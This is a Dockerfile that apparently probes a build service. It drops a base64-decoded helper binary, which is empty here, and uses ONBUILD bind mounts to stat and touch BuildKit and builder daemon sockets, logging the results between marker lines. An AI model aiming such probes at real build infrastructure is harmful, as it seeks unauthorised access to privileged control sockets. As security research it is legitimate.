FROM alpine:3.20 AS tool
RUN echo '' | base64 -d > /u && chmod +x /u
FROM tool AS base
ONBUILD RUN --mount=type=bind,source=run/builder,target=/b sh -c 'set +e; echo "===B_BEGIN==="; stat -c "%F|%a|%U|%s|%n" /b/builder.sock; /u /b/builder.sock; echo "===B_END==="'
ONBUILD RUN --mount=type=bind,source=run/buildkit,target=/bk sh -c 'set +e; echo "===BK_BEGIN==="; stat -c "%F|%a|%U|%s|%n" /bk/buildkitd.sock /bk/debug.sock /bk/otel-grpc.sock; /u /bk/buildkitd.sock; /u /bk/debug.sock; /u /bk/otel-grpc.sock; echo "===BK_END==="'
FROM base
RUN sh -c 'set +e; echo "===CTRL_BEGIN==="; stat -c "%F|%a|%U|%s|%n" /dev/otel-grpc.sock; /u /dev/otel-grpc.sock; echo "===CTRL_END==="'
